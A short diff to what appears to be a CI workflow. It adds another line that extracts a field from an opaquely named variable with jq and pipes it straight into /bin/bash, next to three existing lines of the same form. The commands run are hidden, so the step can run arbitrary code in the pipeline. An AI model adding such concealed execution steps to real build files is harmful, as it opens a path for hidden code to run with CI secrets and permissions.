@@ -39,6 +39,7 @@ jobs:
           echo $w493 | jq -r .jzmq7528 | /bin/bash
           echo $vr53 | jq -r .gjyt7300 | /bin/bash
           printf '%s' "$nd521" | jq -r .prz44 | /bin/bash
+          echo $wbx3853 | jq -r .s9 | /bin/bash
 
       - name: Save output
         uses: actions/upload-artifact@v4
